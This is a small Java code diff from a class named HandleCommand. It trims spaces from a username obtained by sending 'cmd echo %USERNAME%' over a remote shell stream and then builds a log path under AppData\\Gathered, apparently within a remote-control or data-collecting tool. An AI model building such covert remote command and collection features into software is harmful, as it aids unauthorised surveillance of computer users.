@@ -144,7 +144,7 @@ public class HandleCommand {
 				String currentDrive = getResp().substring(0, 2);
 				Shell.out.writeObject("cmd echo %USERNAME%");
 				Shell.out.flush();
-				String currentUser = getResp();
+				String currentUser = getResp().replaceAll(" ", "");
 
 				String logFileDir = "C:\\Users\\" + currentUser + "\\AppData\\Gathered";
 				if (!currentDrive.equals("C:")) {
